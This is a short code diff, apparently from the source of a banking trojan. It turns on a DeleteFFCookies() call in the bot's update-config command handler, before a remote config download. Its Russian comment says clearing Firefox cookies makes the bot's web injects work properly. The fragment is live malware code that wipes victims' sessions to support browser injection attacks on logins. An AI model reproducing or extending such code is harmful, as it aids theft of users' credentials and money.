@@ -659,7 +659,10 @@ bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 
 	#ifdef BotConfigH
 //		DeleteIECookies();
-//		DeleteFFCookies();
+
+		/* Очистка куков ФФ  вызывается для корректной работы инжектов в FireFox  */
+
+		DeleteFFCookies();
 		return Config::Download(Args);
 	#else
 		return false;
